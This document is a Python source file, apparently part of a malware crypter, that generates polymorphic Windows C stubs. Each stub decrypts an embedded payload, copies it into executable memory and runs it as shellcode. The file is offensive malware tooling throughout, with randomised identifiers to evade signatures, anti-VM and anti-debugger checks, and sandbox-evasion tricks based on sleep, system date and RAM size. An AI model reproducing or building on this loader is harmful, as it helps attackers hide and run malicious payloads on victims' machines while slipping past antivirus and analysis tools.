# modules/stub/stubgen.py
import os
import string
import random
from .compiler import DynamicCompiler
from ..encryption.keygen import KeyGenerator

class StubGenerator:
    def __init__(self, evasion_level="High"):
        self.evasion_level = evasion_level
        self.compiler = DynamicCompiler()
        
    def generate_stub(self, encrypted_data, keys, output_dir):
        """Génère un stub polymorphe en C"""
        # Génération des noms de variables/fonctions aléatoires
        var_names = self._generate_random_names(20)
        
        # Template de base
        stub_code = self._generate_stub_template(encrypted_data, keys, var_names)
        
        # Ajout des techniques d'évasion
        if self.evasion_level in ["High", "Maximum"]:
            stub_code = self._add_evasion_techniques(stub_code, var_names)
            
        # Sauvegarde du code source
        stub_path = os.path.join(output_dir, "stub.c")
        with open(stub_path, 'w') as f:
            f.write(stub_code)
            
        # Compilation
        exe_path = self.compiler.compile_stub(stub_path, output_dir)
        
        return exe_path
        
    def _generate_random_names(self, count):
        """Génère des noms de variables/fonctions aléatoires"""
        names = []
        for _ in range(count):
            length = random.randint(8, 15)
            name = ''.join(random.choices(string.ascii_letters, k=length))
            names.append(name)
        return names
        
    def _generate_stub_template(self, encrypted_data, keys, var_names):
        """Génère le template C de base"""
        # Conversion des données en tableau C
        data_array = self._bytes_to_c_array(encrypted_data)
        
        # Clés de déchiffrement
        if keys['method'] == 'AES-GCM':
            key_array = self._bytes_to_c_array(keys['aes_key'])
            nonce_array = self._bytes_to_c_array(keys['nonce'])
        else:
            # Gestion des autres méthodes...
            key_array = self._bytes_to_c_array(keys['aes_key'])
            nonce_array = self._bytes_to_c_array(keys['nonce'])
            
        template = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Anti-debug et anti-VM
{self._generate_antivm_code(var_names)}

// Données chiffrées
unsigned char {var_names[0]}[] = {{{data_array}}};
unsigned char {var_names[1]}[] = {{{key_array}}};
unsigned char {var_names[2]}[] = {{{nonce_array}}};

// Fonctions de déchiffrement
{self._generate_decrypt_functions(keys, var_names)}

// Point d'entrée principal
int main() {{
    // Vérifications anti-debug
    if ({var_names[10]}()) {{
        return 1;
    }}
    
    // Déchiffrement
    unsigned char* {var_names[5]} = {var_names[7]}({var_names[0]}, sizeof({var_names[0]}));
    
    if ({var_names[5]} != NULL) {{
        // Allocation et exécution
        LPVOID {var_names[6]} = VirtualAlloc(NULL, sizeof({var_names[0]}), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if ({var_names[6]} != NULL) {{
            memcpy({var_names[6]}, {var_names[5]}, sizeof({var_names[0]}));
            
            // Exécution du shellcode
            ((void(*)()) {var_names[6]})();
        }}
        
        // Nettoyage
        free({var_names[5]});
    }}
    
    return 0;
}}
'''
        
        return template
        
    def _bytes_to_c_array(self, data):
        """Convertit des bytes en tableau C"""
        return ', '.join([f'0x{b:02x}' for b in data])
        
    def _generate_antivm_code(self, var_names):
        """Génère le code anti-VM/debug"""
        return f'''
// Détection de VM/Debug
BOOL {var_names[10]}() {{
    // Check VMware
    HKEY {var_names[11]};
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools", 0, KEY_QUERY_VALUE, &{var_names[11]}) == ERROR_SUCCESS) {{
        RegCloseKey({var_names[11]});
        return TRUE;
    }}
    
    // Check VirtualBox
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions", 0, KEY_QUERY_VALUE, &{var_names[11]}) == ERROR_SUCCESS) {{
        RegCloseKey({var_names[11]});
        return TRUE;
    }}
    
    // Check debugging
    if (IsDebuggerPresent()) {{
        return TRUE;
    }}
    
    // Check process name
    char {var_names[12]}[MAX_PATH];
    GetModuleFileNameA(NULL, {var_names[12]}, MAX_PATH);
    if (strstr({var_names[12]}, "sample") || strstr({var_names[12]}, "virus") || strstr({var_names[12]}, "malware")) {{
        return TRUE;
    }}
    
    return FALSE;
}}
'''
        
    def _generate_decrypt_functions(self, keys, var_names):
        """Génère les fonctions de déchiffrement"""
        if keys['method'] == 'AES-GCM':
            return f'''
// Déchiffrement AES-GCM (simplifié pour démo)
unsigned char* {var_names[7]}(unsigned char* {var_names[8]}, int {var_names[9]}) {{
    // Implémentation simplifiée du déchiffrement
    // En production, utiliser une vraie lib crypto
    unsigned char* {var_names[13]} = malloc({var_names[9]});
    if ({var_names[13]} == NULL) return NULL;
    
    // XOR simple pour démo (remplacer par vrai AES-GCM)
    for (int i = 0; i < {var_names[9]}; i++) {{
        {var_names[13]}[i] = {var_names[8]}[i] ^ {var_names[1]}[i % sizeof({var_names[1]})];
    }}
    
    return {var_names[13]};
}}
'''
        
    def _add_evasion_techniques(self, stub_code, var_names):
        """Ajoute des techniques d'évasion avancées"""
        evasion_code = f'''
// Techniques d'évasion supplémentaires
void {var_names[14]}() {{
    // Sleep pour éviter les sandboxes rapides
    Sleep(5000);
    
    // Vérification de l'heure système
    SYSTEMTIME {var_names[15]};
    GetSystemTime(&{var_names[15]});
    if ({var_names[15]}.wYear < 2023) {{
        ExitProcess(0);
    }}
    
    // Vérification des ressources système
    MEMORYSTATUSEX {var_names[16]};
    {var_names[16]}.dwLength = sizeof({var_names[16]});
    GlobalMemoryStatusEx(&{var_names[16]});
    if ({var_names[16]}.ullTotalPhys < 2147483648) {{ // < 2GB RAM
        ExitProcess(0);
    }}
}}
'''
        
        # Insertion dans le stub
        return stub_code.replace("int main() {", f"{evasion_code}\n\nint main() {{\n    {var_names[14]}();")
